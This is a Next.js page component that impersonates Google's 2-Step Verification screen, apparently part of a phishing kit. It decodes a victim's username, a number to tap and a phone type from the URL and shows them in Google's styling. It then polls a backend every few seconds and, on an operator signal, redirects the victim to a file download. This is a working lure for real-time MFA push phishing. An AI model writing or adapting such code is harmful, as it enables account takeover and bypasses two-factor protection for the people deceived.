'use client';
import { useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import { notFound } from 'next/navigation';
import '../../public/styles/codetap.css'; 
function CodetapPageContent() {
  const searchParams = useSearchParams();
  const [userInfo, setUserInfo] = useState<{
    username: string;
    pagetype: string;
    mobiletype: string;
  } | null>(null);
  const [intervalRef, setIntervalRef] = useState<NodeJS.Timeout | null>(null);

  // Separate function for tapped API logic
  const checkTappedStatus = async (user: string) => {
    try {
      const randomParam = [...Array(12)].map(() => Math.random().toString(36)[2]).join('');
      const response = await fetch(`/api/tapped?${randomParam}=${user}`);
      const data = await response.json();
      
      if (data.results && data.results.length > 0) {
        const code = data.results;
        const a = code[0].pagetype;
        const num = parseInt(a, 10);
    // The interval will handle the next check automatically
        
        const filepath = '/file.pdf';
        
        if (Number.isInteger(num) && num === 999) {
          // Clear the interval before redirecting
          if (intervalRef) {
            clearInterval(intervalRef);
          }
          // Execute this block of code if 'a' is an integer equal to 999
          window.location.href = filepath;
        }
      }
    } catch (error) {
      console.error('Error in tapped API request:', error);
    }
  };

  useEffect(() => {
    const encodedData = Array.from(searchParams.values())[0];
    
    if (!encodedData) {
      notFound();
      return;
    }

    try {
      const decodedString = atob(encodedData);
      const parts = decodedString.split('/');
      if (parts.length >= 4) {
        const userInfo = {
          username: parts[1],
          pagetype: parts[2],
          mobiletype: parts[3]
        };
        setUserInfo(userInfo);
        
        // Start checking tapped status every 3 seconds
        const interval = setInterval(() => checkTappedStatus(encodedData), 4000);
        setIntervalRef(interval);
        
        // Cleanup interval on component unmount
        return () => clearInterval(interval);
      } else {
        notFound();
      }
    } catch (error) {
      console.error('Error decoding data:', error);
      notFound();
    }
  }, [searchParams]);

  if (!userInfo) {
    return <div>Loading...</div>;
  }

  return (
    <>
      <div className="maindiv">
        {/* Left Section: Form Half */}
        <div className="form-half">
            <div><img className="divlogo" src="/images/image.png" alt="Logo" /></div>
            <div><span className="welcome">2-Step Verification</span></div><br />
            <div><span className="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
            <div className="userdiv">
              <img className="user-icon" src="/images/user-circle.png" alt="User Icon" />
              <span style={{ color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif' }}>{userInfo.username}</span>
              <img className="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon" />
            </div>
        </div>

        {/* Right Section: Form Half 1 */}
        <div className="form-half1">
          <div className="numberdiv">
            <span className="number">{userInfo.pagetype}</span>
          </div>
          <div className="phonediv">
            <span className="phonetype">Check your {userInfo.mobiletype}</span><br /><br />
            <span className="messaged">Google sent a notification to your {userInfo.mobiletype}. Tap <b>Yes</b>&nbsp;on the notification, then tap&nbsp;<b>{userInfo.pagetype}</b>&nbsp;on your phone to verify it's you.</span>
          </div>
          <div className="rememberme">
            <div><input type="checkbox" className="checkbox" defaultChecked /></div>
            <span className="button">Don't ask again on this device</span>
          </div>
          <div className="tryn">
            <button type="button" className="hyperl1" onClick={() => window.location.href = 'https://mail.google.com'}><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
          </div>
        </div>
      </div>
      
      {/* Bottom Section */}
      <div className="btmdiv">
        <div className="left-div">
          <select className="btmhypl" id="language-select">
            <option value="en">English (United States)</option>
            <option value="fr">French</option>
            <option value="es">Spanish</option>
            <option value="de">German</option>
          </select>
        </div>

        <div className="right-divs">
          <div className="right-div">
            <button id="helpButton" className="btmhypl">Help</button>
          </div>
          <div className="right-div">
            <button id="privacyButton" className="btmhypl">Privacy</button>
          </div>
          <div className="right-div">
            <button id="termsButton" className="btmhypl">Terms</button>
          </div>
        </div>
      </div>
    </>
  );
}

export default function CodetapPage() {
  return (
    <SearchParamsWrapper>
      <CodetapPageContent />
    </SearchParamsWrapper>
  );
}
